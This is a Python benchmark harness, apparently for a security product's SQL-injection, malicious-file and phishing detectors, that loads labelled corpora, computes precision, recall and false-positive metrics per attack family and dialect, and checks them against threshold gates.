from __future__ import annotations

import argparse
import asyncio
from collections import Counter
import io
import json
import os
import shutil
import sys
import logging
import warnings
import zipfile
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, List, Optional, Sequence, Tuple

import pandas as pd
from starlette.datastructures import UploadFile

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

os.environ.setdefault("LOG_LEVEL", "ERROR")
os.environ.setdefault("LOKY_MAX_CPU_COUNT", "4")
logging.getLogger().setLevel(logging.ERROR)

from backend.security.request_context import reset_current_service, set_current_service


REPO_ROOT = Path(__file__).resolve().parents[2]
BACKEND_ROOT = REPO_ROOT / "backend"
CORPUS_ROOT_DEFAULT = BACKEND_ROOT / "data" / "corpus"
BENCHMARK_ROOT_DEFAULT = BACKEND_ROOT / "data" / "benchmarks"

# Keep benchmark logs readable; warnings remain visible in full test runs.
warnings.filterwarnings(
    "ignore",
    message="X has feature names, but IsolationForest was fitted without feature names",
    category=UserWarning,
)
warnings.filterwarnings(
    "ignore",
    message="X does not have valid feature names, but LGBMClassifier was fitted with feature names",
    category=UserWarning,
)
warnings.filterwarnings(
    "ignore",
    message="Could not find the number of physical cores",
    category=UserWarning,
)


SQL_HIGH_SEVERITY_SCENARIOS = {
    "obfuscated_sqli",
    "stored_procedure_abuse",
    "service_context_trace",
    "whitespace_comment_tampering",
    "encoding_concatenation_evasion",
    "schema_enumeration",
    "stacked_delay_sqli",
    "cross_dialect_evasion",
    "file_os_interaction",
    "service_context_bypass",
}
FILE_HIGH_SEVERITY_SCENARIOS = {
    "malicious_pdf_ooxml",
    "nested_archive_abuse",
    "mime_extension_mismatch",
}
PHISHING_HIGH_SEVERITY_SCENARIOS = {
    "modern_phishing",
    "sender_domain_metadata",
    "url_feature_rich",
    "attachment_feature_rich",
}


DEFAULT_THRESHOLDS = {
    "domains": {
        "sql.analysis": {
            "min_precision": 0.85,
            "min_recall": 0.15,
            "min_f1": 0.25,
            "max_fpr": 0.05,
            "max_high_severity_miss_rate": 0.90,
        },
        "sql.enforcement": {
            "min_precision": 0.85,
            "min_recall": 0.58,
            "min_f1": 0.70,
            "max_fpr": 0.05,
            "max_high_severity_miss_rate": 0.42,
        },
        "file.triage": {
            "min_precision": 0.55,
            "min_recall": 0.65,
            "min_f1": 0.60,
            "max_fpr": 0.55,
            "max_high_severity_miss_rate": 0.40,
        },
        "phishing.detection": {
            "min_precision": 0.95,
            "min_recall": 0.90,
            "min_f1": 0.92,
            "max_fpr": 0.05,
            "max_high_severity_miss_rate": 0.05,
        },
    },
    "sql_slices": {
        "enforcement": {
            "severity_slice": {
                "high_severity": {
                    "min_recall": 0.58,
                    "max_high_severity_miss_rate": 0.42,
                },
                "standard": {
                    "max_fpr": 0.05,
                },
            },
            "attack_family": {
                "obfuscated_sqli": {
                    "min_recall": 0.45,
                    "max_high_severity_miss_rate": 0.56,
                },
                "service_context_abuse": {
                    "min_recall": 0.60,
                    "max_high_severity_miss_rate": 0.40,
                },
                "stored_procedure_abuse": {
                    "min_recall": 0.85,
                    "max_high_severity_miss_rate": 0.15,
                },
            },
            "dialect": {
                "mysql": {
                    "max_fpr": 0.05,
                },
                "oracle": {
                    "max_fpr": 0.05,
                },
                "postgresql": {
                    "max_fpr": 0.05,
                },
                "sqlserver": {
                    "max_fpr": 0.05,
                },
            },
        }
    },
    "sql_heldout": {
        "enforcement": {
            "min_sample_count": 20,
            "min_precision": 0.80,
            "min_recall": 0.52,
            "min_f1": 0.65,
            "max_fpr": 0.08,
            "max_high_severity_miss_rate": 0.48,
        }
    },
    "regression": {
        "max_precision_drop": 0.05,
        "max_recall_drop": 0.05,
        "max_f1_drop": 0.05,
        "max_fpr_increase": 0.05,
        "max_high_severity_miss_rate_increase": 0.05,
    },
    "file_dynamic_policy": {
        "required_sections": [
            "overall",
            "request_decisions",
            "skip_reasons",
            "reason_codes",
            "policy_profiles",
            "dynamic_states",
            "slices",
            "informational_deltas",
            "provider_readiness",
        ],
        "require_reason_code_for_actionable_decisions": True,
        "required_dynamic_state_keys": [
            "completed_rate",
            "unavailable_rate",
            "failed_rate",
            "running_or_deferred_rate",
            "not_requested_rate",
            "requested_but_provider_unavailable_count",
        ],
        "benign_family_request_rate_ceiling": {
            "enabled": True,
            "min_sample_count": 6,
            "max_request_rate": 0.35,
        },
    },
}


@dataclass
class DomainDataset:
    domain: str
    frame: pd.DataFrame
    source_file: Path
    source_hash: str
    source_version: str


@dataclass
class BinaryMetrics:
    tp: int
    fp: int
    tn: int
    fn: int
    precision: float
    recall: float
    f1: float
    false_positive_rate: float
    false_negative_count: int
    high_severity_miss_rate: float
    support: int

    def as_dict(self) -> Dict[str, Any]:
        return {
            "confusion_matrix": {"tp": self.tp, "fp": self.fp, "tn": self.tn, "fn": self.fn},
            "precision": round(self.precision, 4),
            "recall": round(self.recall, 4),
            "f1": round(self.f1, 4),
            "false_positive_rate": round(self.false_positive_rate, 4),
            "false_negative_count": int(self.false_negative_count),
            "high_severity_miss_rate": round(self.high_severity_miss_rate, 4),
            "support": int(self.support),
        }


class _FakeSession:
    def add(self, obj: Any) -> None:
        return None

    def commit(self) -> None:
        return None

    def refresh(self, obj: Any) -> None:
        return None

    def rollback(self) -> None:
        return None


def _safe_float(value: Any, default: float = 0.0) -> float:
    try:
        return float(value)
    except Exception:
        return default


def _norm_slug(value: Any) -> str:
    raw = str(value or "").strip().lower().replace("-", "_").replace(" ", "_")
    return "".join(ch for ch in raw if ch.isalnum() or ch == "_")


def _as_bool(value: Any, default: bool = False) -> bool:
    token = _norm_slug(value)
    if token in {"1", "true", "yes", "y", "on"}:
        return True
    if token in {"0", "false", "no", "n", "off"}:
        return False
    return default


def _derive_sql_group_from_row(row: pd.Series) -> str:
    explicit = _norm_slug(row.get("benchmark_group"))
    if explicit:
        if explicit in {"heldout", "held_out"}:
            return "held_out_adversarial"
        if explicit in {"held_out_adversarial", "tuning", "regression"}:
            return explicit
        return explicit
    source_file = str(row.get("source_file") or "").lower().strip()
    if "heldout" in source_file or "held_out" in source_file or "adversarial" in source_file:
        return "held_out_adversarial"
    if "template" in source_file:
        return "tuning"
    if "seed" in source_file or "weaklabel" in source_file:
        return "regression"
    split = _norm_slug(row.get("split"))
    if split == "train":
        return "tuning"
    if split in {"validation", "test"}:
        return "regression"
    return "regression"


def _filter_sql_frame_by_scope(frame: pd.DataFrame, scope: str) -> pd.DataFrame:
    if "benchmark_group" not in frame.columns:
        scoped = frame.copy()
        scoped["benchmark_group"] = scoped.apply(_derive_sql_group_from_row, axis=1)
    else:
        scoped = frame.copy()
        scoped["benchmark_group"] = scoped["benchmark_group"].apply(_norm_slug)
        scoped.loc[scoped["benchmark_group"] == "", "benchmark_group"] = scoped.apply(
            _derive_sql_group_from_row, axis=1
        )
        scoped.loc[scoped["benchmark_group"] == "heldout", "benchmark_group"] = "held_out_adversarial"
        scoped.loc[scoped["benchmark_group"] == "held_out", "benchmark_group"] = "held_out_adversarial"

    selected_scope = _norm_slug(scope or "combined") or "combined"
    if selected_scope in {"combined", "all"}:
        return scoped.reset_index(drop=True)
    if selected_scope == "original":
        return scoped[scoped["benchmark_group"].isin({"tuning", "regression"})].reset_index(drop=True)
    if selected_scope in {"held_out", "held_out_adversarial"}:
        return scoped[scoped["benchmark_group"] == "held_out_adversarial"].reset_index(drop=True)
    if selected_scope in {"tuning", "regression"}:
        return scoped[scoped["benchmark_group"] == selected_scope].reset_index(drop=True)
    return scoped.reset_index(drop=True)


def _sha256(path: Path) -> str:
    import hashlib

    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 64), b""):
            h.update(chunk)
    return h.hexdigest()


def _read_json(path: Path, default: Any) -> Any:
    if not path.exists():
        return default
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return default


def _write_json(path: Path, payload: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")


def _parse_metadata_json(raw: Any) -> Dict[str, Any]:
    text = str(raw or "").strip()
    if not text:
        return {}
    try:
        parsed = json.loads(text)
        return parsed if isinstance(parsed, dict) else {}
    except Exception:
        return {}


def _extract_sql_query(row: pd.Series) -> str:
    metadata = row.get("metadata") if isinstance(row.get("metadata"), dict) else {}
    query = str(metadata.get("query") or "").strip()
    if query:
        return query
    return str(row.get("text") or "").strip()


def _is_high_severity(domain: str, row: pd.Series) -> bool:
    scenario = str(row.get("scenario") or "").strip()
    if domain == "sql":
        return scenario in SQL_HIGH_SEVERITY_SCENARIOS
    if domain == "file":
        return scenario in FILE_HIGH_SEVERITY_SCENARIOS
    if domain == "phishing":
        return scenario in PHISHING_HIGH_SEVERITY_SCENARIOS
    return False


def _load_domain_dataset(
    *,
    corpus_root: Path,
    domain: str,
    max_samples: Optional[int] = None,
    sql_scope: str = "combined",
) -> DomainDataset:
    latest = corpus_root / domain / "processed" / f"{domain}_corpus_latest.csv"
    if not latest.exists():
        raise FileNotFoundError(f"Missing corpus file: {latest}")
    frame = pd.read_csv(latest, dtype=str, keep_default_na=False).copy()
    frame["label"] = frame["label"].apply(lambda v: int(str(v).strip() or "0"))
    if "benchmark_group" not in frame.columns:
        frame["benchmark_group"] = ""
    if "source_kind" not in frame.columns:
        frame["source_kind"] = ""
    if "source_confidence" not in frame.columns:
        frame["source_confidence"] = ""
    if "severity" not in frame.columns:
        frame["severity"] = ""
    if "benign_scenario_type" not in frame.columns:
        frame["benign_scenario_type"] = ""
    if "tuned_during_phase2_1" not in frame.columns:
        frame["tuned_during_phase2_1"] = ""

    if domain == "sql":
        frame = _filter_sql_frame_by_scope(frame, sql_scope)
        if frame.empty:
            raise ValueError(f"No SQL rows matched sql_scope='{sql_scope}' in {latest}")
    frame["benchmark_group"] = frame["benchmark_group"].apply(_norm_slug)
    frame["source_kind"] = frame["source_kind"].apply(_norm_slug)
    frame["source_confidence"] = frame["source_confidence"].apply(_norm_slug)
    frame["severity"] = frame["severity"].apply(_norm_slug)
    frame["benign_scenario_type"] = frame["benign_scenario_type"].apply(_norm_slug)
    frame["tuned_during_phase2_1"] = frame["tuned_during_phase2_1"].apply(
        lambda v: "true" if _as_bool(v, default=False) else "false"
    )
    frame["metadata"] = frame["metadata_json"].apply(_parse_metadata_json)
    frame["query"] = frame.apply(_extract_sql_query, axis=1)
    frame["high_severity"] = frame.apply(lambda row: _is_high_severity(domain, row), axis=1)
    if max_samples is not None and max_samples > 0:
        frame = frame.head(max_samples).copy()
    version = "latest"
    return DomainDataset(
        domain=domain,
        frame=frame.reset_index(drop=True),
        source_file=latest,
        source_hash=_sha256(latest),
        source_version=version,
    )


def compute_binary_metrics(
    y_true: Sequence[int],
    y_pred: Sequence[int],
    high_severity_flags: Optional[Sequence[bool]] = None,
) -> BinaryMetrics:
    if len(y_true) != len(y_pred):
        raise ValueError("y_true and y_pred length mismatch")
    hs_flags = list(high_severity_flags or [False] * len(y_true))
    if len(hs_flags) != len(y_true):
        raise ValueError("high_severity_flags length mismatch")

    tp = fp = tn = fn = 0
    hs_total = 0
    hs_miss = 0
    for expected, predicted, is_hs in zip(y_true, y_pred, hs_flags):
        e = 1 if int(expected) == 1 else 0
        p = 1 if int(predicted) == 1 else 0
        if e == 1 and p == 1:
            tp += 1
        elif e == 0 and p == 1:
            fp += 1
        elif e == 0 and p == 0:
            tn += 1
        else:
            fn += 1
        if is_hs and e == 1:
            hs_total += 1
            if p == 0:
                hs_miss += 1

    def _div(a: float, b: float) -> float:
        return float(a / b) if b else 0.0

    precision = _div(tp, tp + fp)
    recall = _div(tp, tp + fn)
    f1 = _div(2 * precision * recall, precision + recall) if (precision + recall) else 0.0
    fpr = _div(fp, fp + tn)
    hs_miss_rate = _div(hs_miss, hs_total)
    return BinaryMetrics(
        tp=tp,
        fp=fp,
        tn=tn,
        fn=fn,
        precision=precision,
        recall=recall,
        f1=f1,
        false_positive_rate=fpr,
        false_negative_count=fn,
        high_severity_miss_rate=hs_miss_rate,
        support=len(y_true),
    )


def compute_slice_metrics(
    *,
    records: Sequence[Dict[str, Any]],
    y_true: Sequence[int],
    y_pred: Sequence[int],
    high_severity_flags: Sequence[bool],
    slicers: Dict[str, Callable[[Dict[str, Any]], str]],
) -> Dict[str, Dict[str, Dict[str, Any]]]:
    if not (len(records) == len(y_true) == len(y_pred) == len(high_severity_flags)):
        raise ValueError("slice input lengths must match")
    output: Dict[str, Dict[str, Dict[str, Any]]] = {}
    for slice_name, fn in slicers.items():
        groups: Dict[str, List[int]] = {}
        for idx, row in enumerate(records):
            key = str(fn(row) or "unknown").strip() or "unknown"
            groups.setdefault(key, []).append(idx)
        payload: Dict[str, Dict[str, Any]] = {}
        for key, idxs in sorted(groups.items(), key=lambda x: x[0]):
            t = [int(y_true[i]) for i in idxs]
            p = [int(y_pred[i]) for i in idxs]
            hs = [bool(high_severity_flags[i]) for i in idxs]
            metrics = compute_binary_metrics(t, p, hs)
            payload[key] = metrics.as_dict()
            payload[key]["sample_count"] = len(idxs)
        output[slice_name] = payload
    return output


def _sql_attack_family(scenario: str) -> str:
    mapping = {
        "benign_enterprise_query": "benign_enterprise",
        "orm_generated_query": "benign_orm",
        "cross_dialect_query": "benign_cross_dialect",
        "reporting_analytics_query": "benign_reporting_analytics",
        "parameterized_raw_sql_query": "benign_parameterized_raw_sql",
        "metadata_introspection_query": "benign_metadata_introspection",
        "migration_admin_query": "benign_migration_admin",
        "obfuscated_sqli": "obfuscated_sqli",
        "whitespace_comment_tampering": "obfuscated_sqli",
        "encoding_concatenation_evasion": "obfuscated_sqli",
        "stored_procedure_abuse": "stored_procedure_abuse",
        "service_context_trace": "service_context_abuse",
        "service_context_bypass": "service_context_abuse",
        "stacked_delay_sqli": "stacked_delay_sqli",
        "schema_enumeration": "schema_enumeration",
        "file_os_interaction": "file_os_interaction",
        "cross_dialect_evasion": "cross_dialect_evasion",
    }
    return mapping.get(str(scenario or "").strip(), "other")


def _file_payload_class(file_type: str, extension: str, scenario: str) -> str:
    ft = str(file_type or "").lower().strip()
    ext = str(extension or "").lower().strip()
    scenario = str(scenario or "").lower().strip()
    if "archive" in scenario or ft in {"zip", "archive"}:
        return "archive"
    if ft in {"pdf", "ooxml", "office", "ole"} or ext in {"pdf", "doc", "docx", "docm", "xls", "xlsx", "xlsm"}:
        return "document"
    if ft in {"script", "html", "js", "javascript", "powershell"} or ext in {"js", "ps1", "sh", "bat", "cmd", "html"}:
        return "script"
    if ft in {"binary", "exe", "pe", "elf"} or ext in {"exe", "dll", "so"}:
        return "binary"
    return "other"


def _file_family_bucket(
    *,
    file_type: Any,
    extension: Any,
    payload_class: Any,
    nested_archive: Any,
    macro_enabled: Any,
    request_decision: Any,
) -> str:
    ft = _norm_slug(file_type)
    ext = _norm_slug(extension)
    pclass = _norm_slug(payload_class)
    decision = _norm_slug(request_decision)
    nested = _as_bool(nested_archive, default=False)
    macro = _as_bool(macro_enabled, default=False)

    office_exts = {"doc", "docx", "docm", "dotm", "xls", "xlsx", "xlsm", "ppt", "pptx", "pptm", "rtf"}
    script_text_exts = {
        "txt",
        "md",
        "csv",
        "log",
        "json",
        "xml",
        "yaml",
        "yml",
        "js",
        "mjs",
        "ts",
        "html",
        "htm",
        "ps1",
        "sh",
        "bat",
        "cmd",
        "vbs",
        "py",
    }

    if nested or pclass == "archive":
        return "archive_nested_archive"
    if ft == "pdf" or ext == "pdf":
        return "pdf"
    if macro or ft in {"ooxml", "office", "ole", "word", "excel", "powerpoint"} or ext in office_exts:
        return "office_macro"
    if pclass == "script" or ft in {"script", "text", "txt", "html", "javascript", "powershell"} or ext in script_text_exts:
        return "script_text"
    if decision == "skip_unsupported":
        return "unsupported_binary_other"
    if pclass == "binary" or ft in {"binary", "exe", "pe", "elf", "unknown"} or ext in {"exe", "dll", "so", "bin", "dat"}:
        return "unsupported_binary_other"
    return "unsupported_binary_other"


def _severity_band(value: Any) -> str:
    sev = _norm_slug(value)
    if sev in {"critical", "high"}:
        return "high"
    if sev in {"medium", "med"}:
        return "medium"
    if sev in {"low", "info", "informational"}:
        return "low"
    return "unknown"


def _distribution(counter: Counter, total: int) -> Dict[str, Dict[str, Any]]:
    denom = max(1, int(total))
    ordered = sorted(counter.items(), key=lambda item: (-int(item[1]), str(item[0])))
    return {
        str(key): {
            "count": int(count),
            "rate": round(float(count / denom), 4),
        }
        for key, count in ordered
    }


def _compute_file_policy_rates(*, total: int, decision_counter: Counter, state_counter: Counter, requested_count: int, skip_count: int) -> Dict[str, Any]:
    denom = max(1, int(total))
    running_like = int(
        state_counter.get("running", 0)
        + state_counter.get("submitted", 0)
        + state_counter.get("pending_submission", 0)
        + state_counter.get("deferred", 0)
    )
    return {
        "request_rate": round(float(requested_count / denom), 4),
        "not_requested_rate": round(float(decision_counter.get("not_requested", 0) / denom), 4),
        "skip_rate": round(float(skip_count / denom), 4),
        "completed_rate": round(float(state_counter.get("completed", 0) / denom), 4),
        "unavailable_rate": round(float(state_counter.get("unavailable", 0) / denom), 4),
        "failed_rate": round(float(state_counter.get("failed", 0) / denom), 4),
        "running_or_deferred_rate": round(float(running_like / denom), 4),
        "dynamic_not_requested_rate": round(float(state_counter.get("not_requested", 0) / denom), 4),
        "requested_but_provider_unavailable_count": int(decision_counter.get("request_but_provider_unavailable", 0)),
    }


def _summarize_file_dynamic_slice(rows: Sequence[Dict[str, Any]]) -> Dict[str, Any]:
    total = len(rows)
    decision_counter: Counter = Counter()
    skip_reason_counter: Counter = Counter()
    profile_counter: Counter = Counter()
    reason_counter: Counter = Counter()
    state_counter: Counter = Counter()
    requested_count = 0
    skip_count = 0
    missing_reason_code_count = 0
    benign_count = 0
    malicious_count = 0

    for row in rows:
        label = int(row.get("label") or 0)
        if label == 0:
            benign_count += 1
        else:
            malicious_count += 1
        decision = _norm_slug(row.get("dynamic_request_decision")) or "not_reported"
        skip_reason = _norm_slug(row.get("dynamic_skip_reason"))
        profile = _norm_slug(row.get("dynamic_policy_profile")) or "unknown"
        state = _norm_slug(row.get("dynamic_status")) or "unknown"
        reasons = [str(code).strip() for code in list(row.get("dynamic_reason_codes") or []) if str(code).strip()]
        decision_counter[decision] += 1
        profile_counter[profile] += 1
        state_counter[state] += 1
        if bool(row.get("dynamic_requested")):
            requested_count += 1
        if decision.startswith("skip_"):
            skip_count += 1
        if skip_reason:
            skip_reason_counter[skip_reason] += 1
        for code in reasons:
            reason_counter[_norm_slug(code) or str(code)] += 1
        if (decision.startswith("skip_") or decision in {"request_dynamic", "request_but_provider_unavailable"}) and not reasons:
            missing_reason_code_count += 1

    rates = _compute_file_policy_rates(
        total=total,
        decision_counter=decision_counter,
        state_counter=state_counter,
        requested_count=requested_count,
        skip_count=skip_count,
    )
    return {
        "sample_count": int(total),
        "benign_count": int(benign_count),
        "malicious_count": int(malicious_count),
        "benign_only": bool(total > 0 and benign_count == total),
        "request_rate": rates["request_rate"],
        "not_requested_rate": rates["not_requested_rate"],
        "skip_rate": rates["skip_rate"],
        "completed_rate": rates["completed_rate"],
        "unavailable_rate": rates["unavailable_rate"],
        "failed_rate": rates["failed_rate"],
        "running_or_deferred_rate": rates["running_or_deferred_rate"],
        "dynamic_not_requested_rate": rates["dynamic_not_requested_rate"],
        "requested_but_provider_unavailable_count": rates["requested_but_provider_unavailable_count"],
        "request_decisions": _distribution(decision_counter, total),
        "skip_reasons": _distribution(skip_reason_counter, total),
        "policy_profiles": _distribution(profile_counter, total),
        "reason_codes": _distribution(reason_counter, total),
        "dynamic_states": _distribution(state_counter, total),
        "missing_reason_code_count": int(missing_reason_code_count),
    }


def build_file_dynamic_policy_report(predictions: Sequence[Dict[str, Any]]) -> Dict[str, Any]:
    rows = [dict(r or {}) for r in predictions]
    overall = _summarize_file_dynamic_slice(rows)
    total = max(1, int(overall.get("sample_count") or 0))

    by_family: Dict[str, List[Dict[str, Any]]] = {}
    by_severity: Dict[str, List[Dict[str, Any]]] = {}
    by_family_severity: Dict[str, List[Dict[str, Any]]] = {}
    by_decision: Dict[str, List[Dict[str, Any]]] = {}
    by_reason_code: Dict[str, List[Dict[str, Any]]] = {}

    dynamic_added_iocs_total = 0
    dynamic_added_evidence_total = 0
    static_ioc_total = 0
    dynamic_ioc_total = 0
    completed_samples = 0
    completed_with_dynamic_delta = 0
    dynamic_ioc_types: Counter = Counter()

    for row in rows:
        family = str(row.get("file_family") or "unsupported_binary_other")
        severity = str(row.get("severity_band") or "unknown")
        family_key = _norm_slug(family) or "unsupported_binary_other"
        sev_key = _norm_slug(severity) or "unknown"
        decision = _norm_slug(row.get("dynamic_request_decision")) or "not_reported"
        reasons = [(_norm_slug(code) or str(code)) for code in list(row.get("dynamic_reason_codes") or []) if str(code).strip()]
        if not reasons:
            reasons = ["none"]

        by_family.setdefault(family_key, []).append(row)
        by_severity.setdefault(sev_key, []).append(row)
        by_family_severity.setdefault(f"{family_key}__{sev_key}", []).append(row)
        by_decision.setdefault(decision, []).append(row)
        for reason_code in reasons:
            by_reason_code.setdefault(reason_code, []).append(row)

        dyn_status = _norm_slug(row.get("dynamic_status"))
        dyn_ioc_delta = int(row.get("dynamic_added_ioc_count") or 0)
        dyn_evidence_delta = int(row.get("dynamic_added_evidence_count") or 0)
        static_ioc_count = int(row.get("static_ioc_count") or 0)
        dynamic_ioc_count = int(row.get("dynamic_ioc_count") or 0)
        dynamic_added_iocs_total += max(0, dyn_ioc_delta)
        dynamic_added_evidence_total += max(0, dyn_evidence_delta)
        static_ioc_total += max(0, static_ioc_count)
        dynamic_ioc_total += max(0, dynamic_ioc_count)
        if dyn_status == "completed":
            completed_samples += 1
            if dyn_ioc_delta > 0 or dyn_evidence_delta > 0:
                completed_with_dynamic_delta += 1
            for ioc_type in list(row.get("dynamic_ioc_types") or []):
                dynamic_ioc_types[_norm_slug(ioc_type) or str(ioc_type)] += 1

    completed_denom = max(1, completed_samples)
    informational_deltas = {
        "sample_count": int(overall.get("sample_count") or 0),
        "samples_with_dynamic_completed": int(completed_samples),
        "samples_with_dynamic_delta": int(completed_with_dynamic_delta),
        "additional_iocs_from_dynamic_total": int(dynamic_added_iocs_total),
        "additional_evidence_items_from_dynamic_total": int(dynamic_added_evidence_total),
        "avg_additional_iocs_per_completed_sample": round(float(dynamic_added_iocs_total / completed_denom), 4),
        "avg_additional_evidence_per_completed_sample": round(float(dynamic_added_evidence_total / completed_denom), 4),
        "ioc_source_counts": {
            "static_or_non_dynamic": int(static_ioc_total),
            "dynamic": int(dynamic_ioc_total),
        },
        "static_vs_dynamic_source_rates": {
            "static_or_non_dynamic_rate": round(float(static_ioc_total / max(1, static_ioc_total + dynamic_ioc_total)), 4),
            "dynamic_rate": round(float(dynamic_ioc_total / max(1, static_ioc_total + dynamic_ioc_total)), 4),
        },
        "dynamic_origin_correlation_inputs": {
            "total": int(sum(dynamic_ioc_types.values())),
            "by_type": _distribution(dynamic_ioc_types, max(1, sum(dynamic_ioc_types.values()))),
        },
        "limitations": [],
    }
    if completed_samples == 0:
        informational_deltas["limitations"].append(
            "No completed dynamic-analysis samples were observed in this run; IOC/evidence deltas are informational only."
        )
    if dynamic_ioc_total == 0 and dynamic_added_evidence_total == 0:
        informational_deltas["limitations"].append(
            "Dynamic provider produced no additional evidence/IOCs; this does not prove dynamic analysis has no value."
        )

    slices = {
        "file_family": {k: _summarize_file_dynamic_slice(v) for k, v in sorted(by_family.items())},
        "severity_band": {k: _summarize_file_dynamic_slice(v) for k, v in sorted(by_severity.items())},
        "family_severity": {k: _summarize_file_dynamic_slice(v) for k, v in sorted(by_family_severity.items())},
        "request_decision": {k: _summarize_file_dynamic_slice(v) for k, v in sorted(by_decision.items())},
        "reason_code": {k: _summarize_file_dynamic_slice(v) for k, v in sorted(by_reason_code.items())},
    }

    summary = {
        "overall": {
            "sample_count": int(overall.get("sample_count") or 0),
            "request_rate": overall.get("request_rate"),
            "not_requested_rate": overall.get("not_requested_rate"),
            "skip_rate": overall.get("skip_rate"),
            "missing_reason_code_count": int(overall.get("missing_reason_code_count") or 0),
        },
        "request_decisions": overall.get("request_decisions") or {},
        "skip_reasons": overall.get("skip_reasons") or {},
        "reason_codes": overall.get("reason_codes") or {},
        "policy_profiles": overall.get("policy_profiles") or {},
        "dynamic_states": {
            "distribution": overall.get("dynamic_states") or {},
            "completed_rate": overall.get("completed_rate"),
            "unavailable_rate": overall.get("unavailable_rate"),
            "failed_rate": overall.get("failed_rate"),
            "running_or_deferred_rate": overall.get("running_or_deferred_rate"),
            "not_requested_rate": overall.get("dynamic_not_requested_rate"),
            "requested_but_provider_unavailable_count": int(overall.get("requested_but_provider_unavailable_count") or 0),
        },
        "slices": slices,
        "informational_deltas": informational_deltas,
        "limitations": [
            "Dynamic-policy metrics reflect verdict dynamic_analysis state only; they are not inferred from logs.",
            "Quality/value gates for dynamic IOC/evidence uplift are intentionally informational until live provider data is established.",
        ],
    }
    # Keep explicit rates at top-level for easier gate/report extraction.
    summary["overall"].update(
        {
            "completed_rate": overall.get("completed_rate"),
            "unavailable_rate": overall.get("unavailable_rate"),
            "failed_rate": overall.get("failed_rate"),
            "running_or_deferred_rate": overall.get("running_or_deferred_rate"),
            "dynamic_not_requested_rate": overall.get("dynamic_not_requested_rate"),
            "requested_but_provider_unavailable_count": int(overall.get("requested_but_provider_unavailable_count") or 0),
            "row_count": int(total),
        }
    )
    return summary


def _to_file_dynamic_policy_markdown(report: Dict[str, Any]) -> str:
    overall = (report.get("overall") or {})
    provider_readiness = (report.get("provider_readiness") or {})
    lines = [
        "# File Dynamic-Request Policy Summary",
        "",
        f"- sample_count: `{overall.get('sample_count')}`",
        f"- request_rate: `{overall.get('request_rate')}`",
        f"- not_requested_rate: `{overall.get('not_requested_rate')}`",
        f"- skip_rate: `{overall.get('skip_rate')}`",
        f"- completed_rate: `{overall.get('completed_rate')}`",
        f"- unavailable_rate: `{overall.get('unavailable_rate')}`",
        f"- failed_rate: `{overall.get('failed_rate')}`",
        f"- running_or_deferred_rate: `{overall.get('running_or_deferred_rate')}`",
        f"- provider_run_label: `{provider_readiness.get('run_label')}`",
        f"- provider_name: `{provider_readiness.get('provider_name')}`",
        "",
        "## Top Request Decisions",
    ]
    for key, payload in list((report.get("request_decisions") or {}).items())[:8]:
        lines.append(f"- `{key}`: count={payload.get('count')}, rate={payload.get('rate')}")

    lines.append("")
    lines.append("## Top Skip Reasons")
    skip_payload = report.get("skip_reasons") or {}
    if skip_payload:
        for key, payload in list(skip_payload.items())[:8]:
            lines.append(f"- `{key}`: count={payload.get('count')}, rate={payload.get('rate')}")
    else:
        lines.append("- No skip reasons reported.")

    lines.append("")
    lines.append("## Dynamic State Visibility")
    states = report.get("dynamic_states") or {}
    lines.append(f"- completed_rate: `{states.get('completed_rate')}`")
    lines.append(f"- unavailable_rate: `{states.get('unavailable_rate')}`")
    lines.append(f"- failed_rate: `{states.get('failed_rate')}`")
    lines.append(f"- running_or_deferred_rate: `{states.get('running_or_deferred_rate')}`")
    lines.append(f"- not_requested_rate: `{states.get('not_requested_rate')}`")
    lines.append(
        f"- requested_but_provider_unavailable_count: `{states.get('requested_but_provider_unavailable_count')}`"
    )
    lines.append("")
    lines.append("## Provider Readiness")
    lines.append(f"- run_label: `{provider_readiness.get('run_label')}`")
    lines.append(f"- provider_name: `{provider_readiness.get('provider_name')}`")
    lines.append(f"- configured: `{provider_readiness.get('configured')}`")
    lines.append(f"- available: `{provider_readiness.get('available')}`")
    lines.append(f"- validation_state: `{provider_readiness.get('validation_state')}`")
    lines.append(f"- validation_reason: `{provider_readiness.get('validation_reason')}`")

    info = report.get("informational_deltas") or {}
    lines.append("")
    lines.append("## Informational Dynamic Delta")
    lines.append(f"- additional_iocs_from_dynamic_total: `{info.get('additional_iocs_from_dynamic_total')}`")
    lines.append(
        f"- additional_evidence_items_from_dynamic_total: `{info.get('additional_evidence_items_from_dynamic_total')}`"
    )
    lines.append(
        f"- samples_with_dynamic_completed: `{info.get('samples_with_dynamic_completed')}`"
    )
    for limitation in list(info.get("limitations") or []):
        lines.append(f"- limitation: {limitation}")
    for limitation in list(report.get("limitations") or []):
        lines.append(f"- limitation: {limitation}")
    return "\n".join(lines) + "\n"


def _resolve_dynamic_provider_run_label(
    provider_status: Dict[str, Any],
    *,
    runtime_mode: str = "inherit",
) -> str:
    status = provider_status if isinstance(provider_status, dict) else {}
    readiness_state = _norm_slug(status.get("readiness_state"))
    if readiness_state in {"disabled", "fake", "misconfigured", "live_validated", "live_not_validated"}:
        return readiness_state
    active_provider = _norm_slug(status.get("active_provider"))
    configured = bool(status.get("configured"))
    if active_provider in {"", "none", "off", "disabled", "noop"}:
        return "disabled"
    if active_provider == "fake":
        return "fake"
    if not configured:
        return "misconfigured"
    normalized_mode = _norm_slug(runtime_mode or "inherit")
    if normalized_mode == "http":
        return "live_not_validated"
    return "live_not_validated"


def _spam_message_class(label: int, scenario: str) -> str:
    scenario = str(scenario or "").strip()
    if int(label) == 0 and scenario == "legitimate_transactional":
        return "transactional"
    if int(label) == 0:
        return "benign_bulk_or_general"
    return "malicious_campaign"


def _zip_bytes(entries: Dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, payload in entries.items():
            zf.writestr(name, payload)
    return buffer.getvalue()


def _build_file_payload(record: Dict[str, Any]) -> Tuple[str, bytes]:
    scenario = str(record.get("scenario") or "").strip()
    metadata = record.get("metadata") or {}
    filename = str(metadata.get("filename") or record.get("sample_id") or "sample.bin").strip()
    file_type = str(metadata.get("file_type") or "").lower().strip()
